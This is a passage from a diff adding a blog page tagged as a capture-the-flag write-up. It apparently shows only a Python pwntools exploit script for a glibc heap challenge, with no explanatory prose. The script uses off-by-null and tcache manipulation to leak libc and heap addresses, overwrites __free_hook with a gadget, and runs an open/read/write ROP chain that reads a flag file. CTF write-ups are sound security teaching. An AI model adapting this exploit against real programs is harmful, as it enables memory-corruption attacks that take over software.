+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x2000</span>,<span style=color:#4070a0>&#39;push to large bin&#39;</span>) <span style=color:#60a0b0;font-style:italic># 51</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x241</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x28</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 53 fd-&gt;bk : 0xA0 - 0x18</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass-loss control&#39;</span>) <span style=color:#60a0b0;font-style:italic># 54</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0xF8</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 55</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 56</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 57</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 58</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 59</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass-loss control&#39;</span>) <span style=color:#60a0b0;font-style:italic># 60</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x4F8</span>,<span style=color:#4070a0>&#39;to be off-by-null&#39;</span>) <span style=color:#60a0b0;font-style:italic># 61</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;tcache&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
+</span></span><span style=display:flex><span>    delete(<span style=color:#40a070>61</span> <span style=color:#666>+</span> <span style=color:#40a070>1</span> <span style=color:#666>+</span> i)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>54</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>60</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>53</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;tcache&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># 53,54,60,62,63,64,65</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x10</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 53-&gt;66</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>## stashed ##</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x10</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 54-&gt;67</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x240</span>)) <span style=color:#60a0b0;font-style:italic># 60-&gt;68</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>61</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x140</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 61</span>
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>56</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x10</span> <span style=color:#666>-</span> <span style=color:#40a070>0x60</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>__free_hook_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 69&lt;-56</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 70&lt;-57</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>70</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>69</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>56</span>)
+</span></span><span style=display:flex><span>heap_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x1A0</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;heap_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(heap_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span>) <span style=color:#60a0b0;font-style:italic># 69&lt;-56</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span>) <span style=color:#60a0b0;font-style:italic># 70&lt;-57</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span>) <span style=color:#60a0b0;font-style:italic># 71&lt;-58</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>68</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x60</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>5</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x31</span>) <span style=color:#666>+</span> p64(__free_hook_addr)) <span style=color:#60a0b0;font-style:italic># 68</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 72</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>## alloc to __free_hook ##</span>
+</span></span><span style=display:flex><span>magic_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x12be97</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,p64(magic_gadget)) <span style=color:#60a0b0;font-style:italic># 73</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x26542</span>
+</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x26f9e</span>
+</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x12bda6</span>
+</span></span><span style=display:flex><span>syscall_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xcf6c5</span>
+</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x47cf8</span>
+</span></span><span style=display:flex><span>ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xc18ff</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload_addr <span style=color:#666>=</span> heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x270</span>
+</span></span><span style=display:flex><span>str_flag_addr <span style=color:#666>=</span> heap_base <span style=color:#666>+</span> <span style=color:#40a070>0x270</span> <span style=color:#666>+</span> <span style=color:#40a070>5</span> <span style=color:#666>*</span> <span style=color:#40a070>0x8</span> <span style=color:#666>+</span> <span style=color:#40a070>0xB8</span>
+</span></span><span style=display:flex><span>rw_addr <span style=color:#666>=</span> heap_base 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x55E35</span>) <span style=color:#60a0b0;font-style:italic># rax</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(payload_addr <span style=color:#666>-</span> <span style=color:#40a070>0xA0</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>) <span style=color:#60a0b0;font-style:italic># rdx</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(payload_addr <span style=color:#666>+</span> <span style=color:#40a070>0x28</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(ret)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>=</span> <span style=color:#4070a0>&#39;&#39;</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(str_flag_addr) <span style=color:#60a0b0;font-style:italic># name = &#34;./flag&#34;</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rsi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdx_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rax_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>2</span>) <span style=color:#666>+</span> p64(syscall_ret) <span style=color:#60a0b0;font-style:italic># sys_open</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>3</span>) <span style=color:#60a0b0;font-style:italic># fd = 3</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rsi_ret) <span style=color:#666>+</span> p64(rw_addr) <span style=color:#60a0b0;font-style:italic># buf</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdx_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x100</span>) <span style=color:#60a0b0;font-style:italic># len</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;read&#34;</span>])
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic># fd = 1</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rsi_ret) <span style=color:#666>+</span> p64(rw_addr) <span style=color:#60a0b0;font-style:italic># buf</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(pop_rdx_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x100</span>) <span style=color:#60a0b0;font-style:italic># len</span>
+</span></span><span style=display:flex><span>rop_chain <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;write&#34;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> rop_chain
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;./flag</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>add(<span style=color:#007020>len</span>(payload) <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>,payload) <span style=color:#60a0b0;font-style:italic># 74</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>74</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
